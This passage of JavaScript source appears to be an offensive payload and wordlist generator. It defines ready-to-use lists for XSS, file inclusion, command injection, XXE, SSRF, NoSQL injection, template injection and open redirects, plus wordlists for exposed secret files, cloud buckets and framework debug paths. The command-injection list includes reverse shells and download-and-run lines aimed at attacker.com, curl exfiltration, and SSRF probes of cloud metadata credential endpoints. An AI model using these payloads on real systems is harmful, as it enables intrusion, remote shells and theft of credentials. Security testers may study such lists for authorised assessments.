            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<script>Function('a','l','e','r','t','(','1',')')('a','l','e','r','t','(','1',')')</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',1000)</script>",
            "<script>window['ale'+'rt'](1)</script>",
            "<script>top['ale'+'rt'](1)</script>",
            "<script>parent['ale'+'rt'](1)</script>",
            "<script>self['ale'+'rt'](1)</script>"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>alert('XSS')</script>",
            "<script src=//brutelogic.com.br/1.js></script>",
            "<script>alert`XSS`</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.domain)</script>"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%3Cimg%20src=x%20onerror=alert('XSS')%3E",
            "%3Csvg%20onload=alert('XSS')%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
        );
    }
    
    return payloads;
}

function getLFIPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            "../../../etc/passwd",
            "../../../etc/hosts",
            "../../../etc/shadow",
            "../../../etc/group",
            "../../../etc/issue",
            "../../../etc/hostname",
            "../../../etc/ssh/ssh_config",
            "../../../etc/ssh/sshd_config",
            "../../../var/log/auth.log",
            "../../../var/log/apache2/access.log",
            "../../../var/log/apache2/error.log",
            "../../../var/log/nginx/access.log",
            "../../../var/log/nginx/error.log",
            "../../../proc/version",
            "../../../proc/cmdline",
            "../../../proc/self/environ"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "data://text/plain,<?php echo shell_exec('id'); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://id",
            "file:///etc/passwd",
            "file:///etc/hosts"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            "....//....//....//etc/passwd%00",
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.txt",
            "../../../etc/passwd%00.html",
            "../../../etc/passwd\x00",
            "../../../etc/passwd\x00.jpg"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow",
            "%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        );
    }
    
    return payloads;
}

function getRFIPayloads(config) {
    const payloads = [];
    
    if (config.basic) {
        payloads.push(
            "http://evil.com/shell.php",
            "https://evil.com/shell.php",
            "ftp://evil.com/shell.php",
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "http://pastebin.com/raw/shell",
            "https://pastebin.com/raw/shell",
            "http://evil.com/shell.php?",
            "https://evil.com/shell.php?",
            "http://evil.com/shell.php%00",
            "https://evil.com/shell.php%00"
        );
    }
    
    if (config.advanced) {
        payloads.push(
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "php://input",
            "php://filter/read=convert.base64-encode/resource=http://evil.com/shell.php",
            "expect://id",
            "expect://whoami",
            "expect://ls",
            "expect://cat /etc/passwd"
        );
    }
    
    if (config.bypass) {
        payloads.push(
            "http://evil.com/shell.php%00",
            "https://evil.com/shell.php%00",
            "http://evil.com/shell.php%00.jpg",
            "https://evil.com/shell.php%00.jpg",
            "http://evil.com/shell.php\x00",
            "https://evil.com/shell.php\x00"
        );
    }
    
    if (config.encoded) {
        payloads.push(
            "http%3A%2F%2Fevil.com%2Fshell.php",
            "https%3A%2F%2Fevil.com%2Fshell.php",
            "http%3A//evil.com/shell.php",
            "https%3A//evil.com/shell.php",
            "http%3A%2F%2Fevil.com%2Fshell.php%00",
            "https%3A%2F%2Fevil.com%2Fshell.php%00"
        );
    }
    
    return payloads;
}

function getCommandInjectionPayloads(config) {
    const payloads = [];

    if (config.basic) {
        payloads.push(
            ';id', ';whoami', ';ls', ';cat /etc/passwd', ';uname -a',
            '|id', '|whoami', '|ls', '|cat /etc/passwd', '|uname -a',
            '||id', '||whoami', '||ls -la', '&&id', '&&whoami', '&&ls -la',
            '`id`', '`whoami`', '$(id)', '$(whoami)', '$(cat /etc/passwd)',
            '& id', '& whoami', '; ping -c 1 127.0.0.1', '| ping -c 1 127.0.0.1'
        );
    }

    if (config.advanced) {
        payloads.push(
            '; nc -e /bin/sh attacker.com 4444',
            '| nc -e /bin/sh attacker.com 4444',
            '`curl http://attacker.com/$(whoami)`',
            '$(curl http://attacker.com/$(id -u))',
            '; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh',
            '|| python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444))"',
            '; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
            '; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
            '; env', '; set', '; printenv', '; cat /proc/self/environ'
        );
    }

    if (config.bypass) {
        payloads.push(
            ';i""d', ';w\\ho\\ami', '; i$()d', '${IFS}id', '${IFS}cat${IFS}/etc/passwd',
            ';${PATH:0:1}bin${PATH:0:1}id', '; i\\d', '|/bin/id', ';/bin/cat${IFS}/etc/passwd',
            '%0Aid', '%0Awhoami', '%0A/bin/id', '\nwhoami', '\rid',
            ';id #', '|id #', '; id;', '|id|'
        );
    }

    if (config.encoded) {
        payloads.push(
            '%3Bid', '%7Cid', '%26%26id', '%60id%60', '%24%28id%29',
            '%3Bwhoami', '%7Cwhoami', '%0aid', '%0did',
            'JTNCaWQ=', 'aWQ=' // base64 fragments
        );
    }

    return payloads;
}

function getXXEPayloads(config) {
    const payloads = [];

    if (config.basic) {
        payloads.push(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe "XXE">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        );
    }

    if (config.advanced) {
        payloads.push(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><foo>&exfil;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> %local_dtd;]>'
        );
    }

    if (config.bypass) {
        payloads.push(
            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/payload.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd?.xml">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        );
    }

    if (config.encoded) {
        payloads.push(
            '%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E',
            'PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFEOENUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPjxmb28+JnhlOzwvZm9vPg=='
        );
    }

    return payloads;
}

function getSSRFPayloads(config) {
    const payloads = [];

    if (config.basic) {
        payloads.push(
            'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
            'http://127.0.0.1:80', 'http://127.0.0.1:443', 'http://127.0.0.1:22',
            'http://127.0.0.1:6379', 'http://127.0.0.1:3306', 'http://127.0.0.1:8080',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
        );
    }

    if (config.advanced) {
        payloads.push(
            'http://[::1]', 'http://[::]', 'http://0x7f.0.0.1', 'http://2130706433',
            'http://017700000001', 'http://127.1', 'http://127.0.1',
            'gopher://127.0.0.1:6379/_FLUSHALL',
            'dict://127.0.0.1:11211/stat',
            'file:///etc/passwd',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/role',
            'http://100.100.100.200/latest/meta-data/'
        );
    }

    if (config.bypass) {
        payloads.push(
            'http://127.0.0.1.nip.io', 'http://localtest.me', 'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
            'http://0177.0.0.1', 'http://127.000.000.001', 'http://127.0.0.1%00',
            'http://127。0。0。1', 'http://127.0.0.1#@attacker.com',
            'http://attacker.com@127.0.0.1', 'http://127.0.0.1@attacker.com'
        );
    }

    if (config.encoded) {
        payloads.push(
            'http%3A%2F%2F127.0.0.1', 'http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F',
            '%68%74%74%70%3A%2F%2F127.0.0.1', 'http://%31%32%37%2E%30%2E%30%2E%31'
        );
    }

    return payloads;
}

function getLaravelPaths() {
    return [
        '/.env', '/.env.backup', '/.env.example', '/artisan',
        '/storage/logs/laravel.log', '/vendor/', '/app/', '/bootstrap/cache/',
        '/config/app.php', '/routes/web.php', '/routes/api.php',
        '/database/migrations/', '/public/index.php', '/resources/views/',
        '/_ignition/execute-solution', '/telescope', '/horizon'
    ];
}

function getDjangoFlaskPaths() {
    return [
        '/admin/', '/admin/login/', '/static/', '/media/', '/__debug__/',
        '/api/', '/accounts/login/', '/accounts/register/', '/manage.py',
        '/settings.py', '/wsgi.py', '/urls.py', '/.flaskenv',
        '/console', '/debugger', '/werkzeug'
    ];
}

function getSpringPaths() {
    return [
        '/actuator', '/actuator/health', '/actuator/env', '/actuator/beans',
        '/actuator/mappings', '/actuator/heapdump', '/actuator/httptrace',
        '/actuator/metrics', '/actuator/configprops', '/actuator/loggers',
        '/swagger-ui.html', '/swagger-ui/', '/v2/api-docs', '/v3/api-docs',
        '/error', '/trace', '/jolokia'
    ];
}

function getExpressPaths() {
    return [
        '/package.json', '/package-lock.json', '/node_modules/', '/.env',
        '/app.js', '/server.js', '/index.js', '/config/', '/routes/',
        '/views/', '/public/', '/api/', '/debug'
    ];
}

function getRailsPaths() {
    return [
        '/rails/info/properties', '/rails/info/routes', '/rails/mailers',
        '/config/database.yml', '/config/secrets.yml', '/config/master.key',
        '/app/', '/db/schema.rb', '/public/', '/Gemfile', '/Gemfile.lock',
        '/.ruby-version', '/log/development.log', '/log/production.log'
    ];
}

function getAspNetPaths() {
    return [
        '/web.config', '/appsettings.json', '/appsettings.Development.json',
        '/bin/', '/App_Data/', '/App_Code/', '/.vs/', '/obj/', '/wwwroot/',
        '/swagger/', '/swagger/index.html', '/.well-known/',
        '/Trace.axd', '/elmah.axd', '/glimpse.axd'
    ];
}

// Secrets, tokens and config leaks commonly found during recon
function getSecretsWordlist() {
    return [
        '.env', '.env.local', '.env.production', '.env.development', '.env.staging',
        '.env.backup', '.env.old', '.env.save', '.env.bak', '.env.example',
        '.git/config', '.git/HEAD', '.git-credentials', '.gitconfig',
        '.npmrc', '.pypirc', '.netrc', '.htpasswd', '.htaccess',
        'id_rsa', 'id_rsa.pub', 'id_dsa', 'id_ecdsa', 'id_ed25519',
        'known_hosts', 'authorized_keys', '.ssh/id_rsa', '.ssh/config',
        'secrets.json', 'secrets.yml', 'secrets.yaml', 'credentials.json',
        'credentials.yml', 'service-account.json', 'serviceAccountKey.json',
        'firebase.json', 'google-services.json', 'client_secret.json',
        'config.json.bak', 'settings.json.bak', 'appsettings.secrets.json',
        'docker-compose.yml', 'docker-compose.override.yml', 'Dockerfile',
        '.dockerenv', '.dockercfg', '.docker/config.json',
        'private.key', 'private.pem', 'server.key', 'server.pem',
        'certificate.pem', 'keystore.jks', 'cacerts',
        'jwt_secret', 'jwt.secret', 'secret_key', 'secret.key', 'master.key',
        'api_key', 'api_keys.txt', 'apikey.txt', 'access_token', 'refresh_token',
        'swagger.json', 'swagger.yaml', 'openapi.json', 'openapi.yaml',
        '.well-known/security.txt', 'security.txt', 'robots.txt', 'sitemap.xml',
        'CHANGELOG.md', 'composer.lock', 'package-lock.json', 'yarn.lock',
        'webpack.config.js', 'tsconfig.json', '.babelrc', '.eslintrc',
        'phpinfo.php', 'test.php', 'debug.log', 'error.log', 'access.log',
        '.aws/credentials', '.aws/config', '.kube/config', '.terraform/',
        'terraform.tfstate', 'terraform.tfvars', 'ansible.cfg', 'vault.yml'
    ];
}

// Common cloud object storage bucket naming patterns (S3 / GCS / Azure Blob)
function getCloudBucketNames() {
    const prefixes = [
        'assets', 'backup', 'backups', 'data', 'files', 'logs', 'media',
        'static', 'cdn', 'uploads', 'images', 'downloads', 'public',
        'private', 'dev', 'development', 'staging', 'prod', 'production',
        'test', 'testing', 'qa', 'internal', 'external', 'archive',
        'www', 'web', 'app', 'apps', 'mobile', 'api', 'db', 'database',
        'content', 'docs', 'documents', 'reports', 'exports', 'imports',
        'secrets', 'config', 'configs', 'terraform-state', 'tf-state',
        'cache', 'temp', 'tmp', 'storage', 'bucket', 'blob', 's3',
        'website', 'site', 'landing', 'marketing', 'analytics', 'logs-prod',
        'logs-dev', 'user-data', 'userdata', 'customer-data', 'billing'
    ];
    const bucketNames = [...prefixes];
    const suffixes = ['01', '001', '1', '2', 'v1', 'v2', 'new', 'old'];
    prefixes.forEach(p => {
        suffixes.forEach(s => {
            bucketNames.push(`${p}-${s}`);
            bucketNames.push(`${p}${s}`);
        });
        bucketNames.push(`${p}-bucket`);
        bucketNames.push(`${p}-storage`);
    });
    return bucketNames;
}

// Common HTTP parameter/query-string names for fuzzing
function getParameterNames() {
    return [
        'id', 'uid', 'user', 'username', 'user_id', 'userid', 'account',
        'email', 'password', 'passwd', 'pwd', 'token', 'access_token',
        'auth', 'authtoken', 'session', 'sessionid', 'sid', 'key', 'apikey',
        'api_key', 'secret', 'client_id', 'client_secret', 'code', 'state',
        'redirect', 'redirect_uri', 'redirect_url', 'return', 'returnurl',
        'return_url', 'next', 'continue', 'url', 'uri', 'link', 'target',
        'dest', 'destination', 'callback', 'jsonp', 'ref', 'referrer',
        'referer', 'origin', 'host', 'domain', 'site', 'path', 'file',
        'filename', 'filepath', 'folder', 'dir', 'page', 'p', 'view',
        'template', 'include', 'load', 'src', 'source', 'action', 'cmd',
        'command', 'exec', 'run', 'query', 'q', 'search', 's', 'keyword',
        'sort', 'order', 'orderby', 'sortby', 'filter', 'limit', 'offset',
        'page_size', 'per_page', 'count', 'format', 'type', 'mode', 'lang',
        'language', 'locale', 'debug', 'test', 'admin', 'role', 'perm',
        'permission', 'access', 'level', 'status', 'active', 'enabled',
        'disabled', 'callback_url', 'webhook', 'webhook_url', 'image',
        'img', 'avatar', 'document', 'doc', 'upload', 'download', 'export',
        'import', 'data', 'payload', 'input', 'output', 'value', 'name',
        'title', 'description', 'content', 'body', 'message', 'text',
        'html', 'xml', 'json', 'csv', 'version', 'v', 'api_version',
        'timestamp', 'time', 'date', 'from', 'to', 'start', 'end',
        'csrf', 'csrf_token', '_csrf', 'xsrf', 'nonce', 'signature', 'sig',
        'hash', 'checksum', 'otp', 'pin', 'captcha', 'g-recaptcha-response'
    ];
}

function getNoSQLInjectionPayloads(config) {
    const payloads = [];

    if (config.basic) {
        payloads.push(
            '{"$gt":""}', '{"$ne":""}', '{"$ne":null}', '{"$gt":-1}',
            '{"$regex":".*"}', '{"$exists":true}', '{"$where":"1==1"}',
            "' || '1'=='1", "' || 1==1//", "'; return true; var x='",
            'admin\' || \'1\'==\'1', '{"username":"admin","password":{"$ne":null}}',
            '{"$or":[{"a":"a"}]}', "[$ne]=1", "[$gt]=", "[$regex]=.*"
        );
    }

    if (config.advanced) {
        payloads.push(
            '{"$where": "sleep(5000)"}', '{"$where":"this.password.match(/.*/)"}',
            '{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}',
            '1; return this.password.length > 0;',
            '"; return this.a == this.b && \'\' == \'',
            '{"$where": "function(){return true}"}',
            'db.collection.find({"$where": "1==1"})',
            '{"$expr": {"$gt": [1, 0]}}'
        );
    }

    if (config.bypass) {
        payloads.push(
            '{"$Gt":""}', '{"$NE":null}', '[$ne]', '[$gt]', '[$regex]',
            '%27%20%7C%7C%20%271%27%3D%3D%271', '\' %26%26 this.password.match(/.*/)%2F%2F'
        );
    }

    if (config.encoded) {
        payloads.push(
            '%7B%22%24gt%22%3A%22%22%7D', '%7B%22%24ne%22%3Anull%7D',
            '%27%20%7C%7C%20%271%27%3D%3D%271'
        );
    }

    return payloads;
}

function getSSTIPayloads(config) {
    const payloads = [];

    if (config.basic) {
        payloads.push(
            '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
            '{{7*\'7\'}}', '${{7*7}}', '@(7*7)', '{{config}}', '{{settings}}'
        );
    }

    if (config.advanced) {
        payloads.push(
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
            "<%= system('id') %>", "#{ `id` }",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{{ x }}{% endfor %}"
        );
    }

    if (config.bypass) {
        payloads.push(
            '{{7*7}}', '{ {7*7} }', '{{\n7*7\n}}', '{{{7*7}}}',
            '{%print(7*7)%}', "{{''.join(['7','*','7'])}}"
        );
    }

    if (config.encoded) {
        payloads.push(
            '%7B%7B7*7%7D%7D', '%24%7B7*7%7D', '%3C%25%3D%207*7%20%25%3E'
        );
    }

    return payloads;
}

function getOpenRedirectPayloads(config) {
    const payloads = [];

    if (config.basic) {
        payloads.push(
            '//evil.com', '//evil.com/', '/\\evil.com', '\\\\evil.com',
            'https://evil.com', 'http://evil.com', '//google.com%2f@evil.com',
            'https:evil.com', '/%2f/evil.com', '/%2fevil.com',
            'https://trusted.com@evil.com', 'https://trusted.com.evil.com'
        );
    }

    if (config.advanced) {
        payloads.push(
            '//evil.com/%2e%2e', 'https://evil.com/%2f%2e%2e',
            'javascript:alert(document.domain)', 'data:text/html,<script>alert(1)</script>',
            '/\\/evil.com', '\\/evil.com', '////evil.com', '/////evil.com',
            '//evil.com/..;/'
        );
    }

    if (config.bypass) {
        payloads.push(
            '/\\evil.com', '/.evil.com', '//evil%E3%80%82com', '//evil․com',
            'https://evil.com\\@trusted.com', '//trusted.com%2f%2e%2e%2f%2f%2f%2fevil.com'
        );
    }

    if (config.encoded) {
        payloads.push(
            '%2F%2Fevil.com', '%2Fevil.com', 'https%3A%2F%2Fevil.com',
            '%68%74%74%70%3A%2F%2Fevil.com'
        );
    }

    return payloads;
}

// Export for potential module use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        generateEnumeration,
        generateBruteForce,
        generateCredentials,
        generateUsernames,
        generatePatterns,
        generateHybrid,
        generateAPI,
        generateWebTech,
        generateSecurity
    };
}
